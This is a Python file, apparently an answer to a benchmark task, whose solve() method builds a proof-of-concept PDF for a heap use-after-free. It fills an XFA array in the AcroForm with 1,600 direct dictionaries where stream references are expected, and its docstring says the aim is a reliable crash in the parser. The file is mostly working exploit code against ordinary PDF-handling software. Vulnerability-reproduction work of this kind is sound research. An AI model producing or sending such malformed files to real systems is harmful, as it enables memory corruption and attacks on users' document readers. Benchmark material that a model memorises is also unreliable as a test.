import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap use-after-free vulnerability.

        The PoC is a crafted PDF file that exploits a reference counting error
        in the handling of standalone forms, specifically within the XFA
        (XML Forms Architecture) component.

        The vulnerability occurs when a direct dictionary object is placed in
        an XFA array where an indirect stream reference is expected. The parser
        incorrectly handles this non-compliant structure, failing to increment
        the dictionary's reference count while creating an internal object wrapper.
        During form destruction, the reference count is decremented, leading to
        premature deallocation and a subsequent use-after-free.

        This PoC constructs a PDF with a large array of such malformed entries
        to ensure the memory corruption results in a reliable crash.
        """
        num_entries = 1600

        xfa_array_content = []
        for i in range(num_entries):
            key = f"k{i}"
            dict_val = f"<</V {i}>>"
            xfa_array_content.append(f"({key}) {dict_val}")

        xfa_array_str = "[\n" + "\n".join(xfa_array_content) + "\n]"

        objects = []

        # Object 1: Catalog - Document Root
        objects.append(
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 3 0 R >>"
        )

        # Object 2: Pages Tree
        objects.append(
            b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>"
        )

        # Object 3: AcroForm Dictionary
        # References the malicious XFA object that triggers the vulnerability.
        objects.append(
            b"<< /Fields [] /XFA 5 0 R >>"
        )
        
        # Object 4: Page Object
        objects.append(
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] >>"
        )

        # Object 5: The malicious XFA array.
        # This array contains direct dictionaries where stream references are expected,
        # triggering the reference counting bug upon destruction.
        objects.append(xfa_array_str.encode('latin-1'))

        # --- Assemble the PDF file ---
        poc = b"%PDF-1.7\n\x80\x80\x80\x80\n" # Header + binary comment

        offsets = []
        for i, content in enumerate(objects):
            obj_num = i + 1
            offsets.append(len(poc))
            poc += f"{obj_num} 0 obj\n".encode('latin-1')
            poc += content
            poc += b"\nendobj\n"

        # Cross-reference (xref) table
        xref_start = len(poc)
        poc += b"xref\n"
        num_total_objects = len(objects) + 1
        poc += f"0 {num_total_objects}\n".encode('latin-1')
        poc += b"0000000000 65535 f \n"
        for offset in offsets:
            poc += f"{offset:010d} 00000 n \n".encode('latin-1')

        # PDF Trailer
        poc += b"trailer\n"
        poc += b"<<\n"
        poc += f"  /Size {num_total_objects}\n".encode('latin-1')
        poc += b"  /Root 1 0 R\n"
        poc += b">>\n"
        poc += b"startxref\n"
        poc += str(xref_start).encode('latin-1')
        poc += b"\n%%EOF\n"

        return poc